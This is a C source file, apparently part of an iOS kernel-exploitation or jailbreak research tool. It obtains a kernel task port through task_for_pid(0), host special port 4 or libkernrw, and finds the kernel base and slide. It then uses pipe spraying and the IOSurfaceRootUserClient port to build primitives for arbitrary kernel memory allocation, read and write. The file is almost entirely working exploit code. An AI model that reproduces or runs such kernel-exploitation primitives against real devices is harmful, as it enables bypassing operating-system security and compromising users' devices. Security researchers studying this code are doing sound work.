#include <stdio.h>
#include <dlfcn.h>
#include "main.h"
#include "krw.h"
#include "iokit.h"
#include "IOSurfaceRoot.h"
#include "piper.h"
#include "kutils.h"
#include "offsets.h"
#include "kutils.h"
#include "find_port.h"
#include "kprimitive.h"
#include "kalloc_pipe.h"

task_t tfp0 = MACH_PORT_NULL;
void *libkernrw = NULL;
extern uint64_t kbase;
extern uint64_t kslide;

static kern_return_t
init_kernrw(void) {
	kern_return_t ret = task_for_pid(mach_task_self(), 0, &tfp0);
	mach_port_t host;
	pid_t pid;

	if(ret != KERN_SUCCESS) {
		host = mach_host_self();
		if(MACH_PORT_VALID(host)) {
			printf("host: 0x%" PRIx32 "\n", host);
			ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &tfp0);
			mach_port_deallocate(mach_task_self(), host);
		}
	}
	if(ret == KERN_SUCCESS && MACH_PORT_VALID(tfp0)) {
		if(pid_for_task(tfp0, &pid) == KERN_SUCCESS && pid == 0) {
			return ret;
		}
		mach_port_deallocate(mach_task_self(), tfp0);
	}

	libkernrw = dlopen("/usr/lib/libkernrw.0.dylib", RTLD_NOW);
	if(libkernrw != NULL) {
		void *requestKernRw_ptr = dlsym(libkernrw, "requestKernRw");
		if(requestKernRw_ptr != NULL) {
			int (*requestKernRw)(void) = NULL;
    		requestKernRw = (int (*)(void))requestKernRw_ptr;
			if(requestKernRw() == 0) return KERN_SUCCESS;
		}
	}

	return KERN_FAILURE;
}
// ============================================================
// ======================= !!! START !!! ======================
// ============================================================

int *pipefds = NULL;
uint8_t *pipe_buffer;
size_t pipe_buffer_size = 0x1000;

uint64_t IOSurfaceRootUserClient_addr = 0;

int main(int argc, char *argv[], char *envp[]) {

	offsets_init();

	if(init_kernrw() != KERN_SUCCESS)
		return 1;

	int r = get_kbase(&kbase);
    printf("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);

	IOSurfaceRoot_init();
	printf("IOSurfaceRootUserClient = 0x%x\n", IOSurfaceRootUserClient);
	uint32_t IOSurface_id = iosurface_s_create_surface_fast_path();
	printf("IOSurface_id = 0x%x\n", IOSurface_id);

	//create pipes
	pipefds = create_pipes();
	pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
	//memset_pattern4 = 메모리 설정 함수로, 4바이트 패턴을 사용하여 특정 메모리 영역을 채울 때 사용, 따라서 pipe 4글자로 채워짐
	memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
	pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size);
	read_pipe();	//?

	//build_stable_kmem_api
	uint64_t IOSurfaceRootUserClient_port = find_port(IOSurfaceRootUserClient);
	IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + off_ipc_port_ip_kobject);
	build_stable_kmem_api();

	printf("kpri_read32(kbase) = 0x%x\n", kpri_read32(kbase));
	pipe_info_t *fakePipeAlloc = kalloc_via_pipe(0x4000);
	uint64_t kptr = fakePipeAlloc->kern_buffer;
	printf("kptr = 0x%llx\n", kptr);
	printf("[before] kpri_read32(kptr) = 0x%x, kpri_read32(kptr+4) = 0x%x\n", kpri_read32(kptr), kpri_read32(kptr+4));
	kpri_write64(kptr, 0x41424344CAFEBABE);
	printf("[after] kpri_read32(kptr) = 0x%x, kpri_read32(kptr+4) = 0x%x\n", kpri_read32(kptr), kpri_read32(kptr+4));
	kfree_via_pipe(fakePipeAlloc);
	
	//clean
	clean_stable_kmem_api();
	pipe_close(pipefds);
	IOSurfaceRoot_exit();

	printf("done\n");

	return 0;
}
